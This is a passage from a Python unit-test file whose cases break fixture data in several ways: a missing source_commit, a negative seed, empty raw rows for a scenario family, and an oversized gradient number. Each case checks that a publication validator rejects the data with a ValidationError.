        payload = json.loads(path.read_text(encoding="utf-8"))
        del payload["rows"][0]["source_commit"]
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "source_commit"):
            validate_publication(root)

        root = make_valid_fixture(self)
        manifest = json.loads((root / "data/manifest.json").read_text(encoding="utf-8"))
        manifest["source"]["seeds"] = {"estimator": [-1]}
        write_fixture_json(root / "data/manifest.json", manifest)
        with self.assertRaisesRegex(ValidationError, "seed"):
            validate_publication(root)

    def test_scenario_families_must_have_raw_evidence(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/triangle_2d.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"] = []
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "triangle_2d"):
            validate_publication(root)

    def test_oversized_json_numbers_fail_with_validation_error(self):
        root = make_valid_fixture(self)
        path = root / "data/raw/path_tracer_gradients.json"
        payload = json.loads(path.read_text(encoding="utf-8"))
        payload["rows"][0]["gradient"] = [10**4000]
        write_fixture_json(path, payload)
        _refresh_manifest(root)
        with self.assertRaisesRegex(ValidationError, "finite"):
            validate_publication(root)


if __name__ == "__main__":
    unittest.main(verbosity=2)
